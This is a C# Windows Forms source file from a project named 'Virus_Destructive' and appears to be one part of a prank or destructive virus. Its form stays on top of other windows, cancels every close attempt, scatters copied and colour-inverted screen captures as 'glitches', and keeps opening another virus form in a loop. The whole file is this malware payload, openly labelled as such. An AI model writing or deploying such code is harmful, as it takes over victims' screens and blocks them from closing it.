using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Virus_Destructive
{
    public partial class Virus_last : Form
    {
        public Virus_last()
        {
            InitializeComponent();          
            TopMost = true;
            this.TransparencyKey = this.BackColor;
        }

        private void Virus_last_Load(object sender, EventArgs e)
        {
            tmr_loop2.Start();
            tmr_back_to_last.Start();
            r = new Random();

        }

        Graphics g;
        Bitmap bmp;
        Random r;

        private void tmr_loop_Tick(object sender, EventArgs e)
        {
            
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {

        }

        private void Virus_last_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void tmr_loop_Tick_1(object sender, EventArgs e)
        {
            tmr_loop2.Stop();
            //this payload make glitchs on your screen :)
            var endWidth = 500;
            var endHeight = 500;

            var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap(startWidth, startHeight);

            g = this.CreateGraphics();
            g = Graphics.FromImage(bmp);

            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); // divide by two in order to center
            var yPos = Math.Min(0, MousePosition.Y - (startHeight / 500));

            g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));





            pictureBox1 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Height = 300;
            pictureBox1.Width = 300;

            pictureBox1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox1);
            pictureBox2 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox2.Height = 240;
            pictureBox2.Width = 180;

            pictureBox2.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox2);
            pictureBox3 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox3.Height = 300;
            pictureBox3.Width = 300;

            pictureBox3.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox3);
            pictureBox4 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox4.Height = 300;
            pictureBox4.Width = 300;

            pictureBox4.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox4);

            pictureBox5 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox5.Height = 150;
            pictureBox5.Width = 200;

            pictureBox5.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox5);

            pictureBox1.Image = bmp;
            pictureBox2.Image = bmp;
            pictureBox3.Image = bmp;
            pictureBox4.Image = bmp;
            pictureBox5.Image = bmp;

            Bitmap pic = new Bitmap(pictureBox3.Image);
            for (int y = 0; (y <= (pic.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic.Width - 1)); x++)
                {
                    Color inv = pic.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic.SetPixel(x, y, inv);
                }
            }

            pictureBox3.Image = pic;

            Bitmap pic2 = new Bitmap(pictureBox5.Image);
            for (int y = 0; (y <= (pic2.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic2.Width - 1)); x++)
                {
                    Color inv = pic2.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic2.SetPixel(x, y, inv);
                }
            }

            pictureBox5.Image = pic2;
            tmr_loop2.Start();
        }

        private void tmr_back_to_last_Tick(object sender, EventArgs e)
        {
            tmr_back_to_last.Stop();
            var NewForm = new virus_last_again();
            NewForm.ShowDialog();
            tmr_back_to_last.Start();
        }
    }
}
